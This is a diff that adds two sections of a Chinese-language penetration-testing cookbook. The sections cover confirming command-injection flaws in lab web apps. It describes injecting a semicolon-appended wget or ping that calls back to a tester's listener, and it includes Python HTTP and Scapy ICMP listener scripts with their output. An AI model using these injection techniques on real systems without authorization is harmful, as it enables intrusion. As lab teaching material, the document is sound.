@@ -912,3 +912,102 @@ root@KaliLinux:~# /etc/init.d/apache2 start
 ### 工作原理
 
 CSRF 的成因是请求最终由用户的会话生成。这个攻击利用受害者浏览器已经和远程 Web 服务器建立连接的信任。在 GET 方法 CSRF 的例子中，受害者被诱导访问某个 URL，其中的参数为恶意事务而定义。在 POST 方法 CSRF 的例子中，受害者被诱导浏览定义了参数的页面，这些参数随后会由受害者的浏览器转发给漏洞服务器，来指定恶意事务。在每个例子中，事务由于请求来自受害者的浏览器而被执行，受害者已经和漏洞服务器建立了可信的会话。
+
+## 7.18 使用 HTTP 流量验证命令注入漏洞
+
+命令注入可能是移植 Web 应用攻击向量中最危险的漏洞了。多数攻击者尝试利用该漏洞，以期望它们最后能够在底层 OS 上执行任意的代码。命令执行漏洞提供了无需额外步骤的可能。这个秘籍中，我们会讨论如何使用 Web 服务器日志或自定义 Web 服务脚本来确认命令执行漏洞。
+
+### 准备
+
+为了对目标执行命令注入漏洞测试，你需要拥有运行一个或多个含有命令执行漏洞的 Web 应用的远程系统。所提供的例子中，我们使用 Metasploitable2 实例来完成任务。 Metasploitable2 拥有多种预安装的漏洞 Web 应用，运行在 TCP 80 端口上。配置 Metasploitable2 的更多信息请参考第一章中的“安装 Metasploitable2”秘籍。
+
+此外，这个秘籍也需要使用例如 VIM 或者 Nano 的文本编辑器，将脚本写到文件系统。更多编写脚本的信息请参考第一章的“使用文本编辑器（VIM 或 Nano）”秘籍。
+
+### 操作步骤
+
+通过执行命令，强迫后端系统和 Web 服务器交互，我们就能够验证 Web 应用中的命令注入漏洞。日志可以作为漏洞服务器和它交互的证据。作为替代，可以编写一个自定义脚本来生成一个临时的 Web 服务，它可以监听外部连接，并打印接收到的请求。下面的 Python 代码完成了这件事情：
+
+```py
+#!/usr/bin/python
+import socket
+httprecv = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
+httprecv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
+httprecv.bind(("0.0.0.0",8000)) 
+httprecv.listen(2)
+
+(client, ( ip,sock)) = httprecv.accept()
+print "Received connection from : ", ip 
+data = client.recv(4096) 
+print str(data)
+
+client.close() 
+httprecv.close() 
+```
+
+一旦执行脚本，我们需要强迫目标服务器和监听服务交互，来确认命令注入漏洞。DWVA 应用拥有`ping`功能，可以用于 ping 一个指定 IP 地址。用户输入直接传递给系统调用，可以修改来执行底层 OS 的任意命令、我们可以通过使用分号来添加多个命令，每个命令依次排列，像这样：
+
+![](img/7-18-1.jpg)
+
+在上面的例子中，输入用于 ping `127.0.0.1`，并且对`http://172.16.36.224:8000`执行`wget`。`wget`请求对应临时的 Python 监听服务。在提交输入后，我们可以通过参考脚本的输入来验证命令执行：
+
+```py
+root@KaliLinux:~# ./httprecv.py 
+Received connection from :  172.16.36.135 
+GET / HTTP/1.0 
+User-Agent: Wget/1.10.2 
+Accept: */* Host: 172.16.36.224:8000 
+Connection: Keep-Alive 
+```
+
+### 工作原理
+
+Python 脚本用于确认命令执行漏洞，因为它证明了命令可以通过来自不同系统的注入载荷在目标服务器上执行。载荷输入到服务器的时候，不可能同时执行相似的请求。但是，即使载荷并不是被检测到的流量的真正来源，我们也可以轻易尝试多次来排除错误情况。
+
+## 7.19 使用 ICMP 流量 来验证命令注入
+
+命令注入可能是移植 Web 应用攻击向量中最危险的漏洞了。多数攻击者尝试利用该漏洞，以期望它们最后能够在底层 OS 上执行任意的代码。命令执行漏洞提供了无需额外步骤的可能。这个秘籍中，我们会讨论如何使用 ICMP 流量来编写用于确认命令执行漏洞的自定义脚本。
+
+### 准备
+
+为了对目标执行命令注入漏洞测试，你需要拥有运行一个或多个含有命令执行漏洞的 Web 应用的远程系统。所提供的例子中，我们使用 Metasploitable2 实例来完成任务。 Metasploitable2 拥有多种预安装的漏洞 Web 应用，运行在 TCP 80 端口上。配置 Metasploitable2 的更多信息请参考第一章中的“安装 Metasploitable2”秘籍。
+
+此外，这个秘籍也需要使用例如 VIM 或者 Nano 的文本编辑器，将脚本写到文件系统。更多编写脚本的信息请参考第一章的“使用文本编辑器（VIM 或 Nano）”秘籍。
+
+### 操作步骤
+
+通过执行命令，强迫后端系统发送 ICMP 流量给监听服务，我们可以验证 Web 应用中的命令注入漏洞。接收到的 ICMP 回响请求可以用于识别漏洞系统。下面是一段 Python 代码，使用 Scapy 库来实现：
+
+```py
+#!/usr/bin/python
+
+import logging 
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR) 
+from scapy.all import *
+
+def rules(pkt):   
+    try:      
+        if (pkt[IP].dst=="172.16.36.224") and (pkt[ICMP]):         
+            print str(pkt[IP].src) + " is exploitable"   
+    except:      
+        pass
+
+print "Listening for Incoming ICMP Traffic.  Use Ctrl+C to stop listening"
+
+sniff(lfilter=rules,store=0)
+```
+
+在 ICMP 监听器执行之后，我们需要尝试从漏洞服务器向监听服务发送 ICMP 回响请求。这可以通过将`ping`命令注入到存在命令注入漏洞的用户输入来完成。在 Mutillidae 中，执行 DNS 枚举的功能存在漏洞，它直接将用户输入传递给系统调用。通过使用分号，单独的`ping`请求可以追加到用户输入后面。
+
+![](img/7-19-1.jpg)
+
+假设服务器存在命令注入漏洞，Python 监听器会提示收到了 ICMP 回响请求，而且目标服务器可能存在漏洞。
+
+```
+root@KaliLinux:~# ./listener.py 
+Listening for Incoming ICMP Traffic.  Use Ctrl+C to stop listening 
+172.16.36.135 is exploitable
+```
+
+### 工作原理
+
+Python 脚本用于确认命令执行漏洞，因为它证明了命令可以通过来自不同系统的注入载荷在目标服务器上执行。载荷输入到服务器的时候，不可能同时执行相似的请求。但是，即使载荷并不是被检测到的流量的真正来源，我们也可以轻易尝试多次来排除错误情况。
